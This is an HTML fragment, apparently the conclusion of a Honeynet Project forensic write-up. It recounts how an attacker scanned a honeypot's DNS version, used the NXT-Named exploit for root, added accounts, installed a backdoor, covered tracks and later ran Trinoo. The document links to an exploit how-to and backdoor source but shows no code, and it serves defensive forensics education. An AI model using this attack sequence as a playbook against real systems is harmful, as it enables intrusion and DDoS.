+<br>
+We have just covered step by step how a honeypot was compromised, backdoored,
+and eventually used for a Trinoo attack.&nbsp; On 25 April, the black-hat
+first scanned the honeypot for which version of DNS version it was running.&nbsp;
+The following day, on 26 April, she executed the NXT-Named exploit to gain
+a root shell (see the <a href="../forensics/NXT-Howto.txt">NXT-Howto</a>
+for a black-hat HOWTO on the exploit). Once she gained a root shell, she
+created two system accounts, <i>twin</i> and <i>hantu</i>.&nbsp; Following
+this she immediately telneted to the box, gained super user access, then
+downloaded and installed her backdoor, 
+<a href="../forensics/bj.txt">bj.c</a>.&nbsp;
+She then executed a script to cover her tracks and then left the system.&nbsp;
+Over the following weeks she attempted to connect to the system, however
+it was offline.&nbsp; Finally, on May 9 she gained access, installed and
+then executed Trinoo.&nbsp; At this point the honeypot was taken offline
+for good.&nbsp; The majority of forensics was conducted using system logs
+from the compromised system and snort logs and alerts.  Several other people
+have contributed <a href="../forensics/analysis.txt">
+additional analysis</a> of the attack.
+
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>Conclusion</font></font></b>
+<br>
+We have just covered a step by step analysis of how a honeypot compromised.&nbsp;
+The goal was to determine how the system was compromised using forensic
+anaylisis of system and IDS logs.&nbsp; By analyzing this attack, you should
+have a better understanding of what to expect and look for when analyzing
+a system attack.  If you would like to learn more about how this information
+was obtained, check out <a href="../honeypot.html">
+To Build A Honeypot</a>.
+
+<p>
+I would like to thank both <a href="mailto:roesch@hiverworld.com">Marty
+Roesch</a> and <a href="mailto:vision@whitehats.com">Max Vision</a> for
+their contribution to the security community.&nbsp; What I have learned
+here would not have been possible without their hard work.  All logs and 
+information were forwarded to CERT before this information
+was released.  Also, attempts were made to contact all IPs involved
+in the attack.
+
+<p>
+<br>
+<br>
+<center>      
+<a href="http://project.honeynet.org">
+<img src="http://project.honeynet.org/small.gif" alt="The Honeynet Project" border=0>
+</a>
+</center>
+<br>
+<p>
+<br>
+
+</body>
+</html>
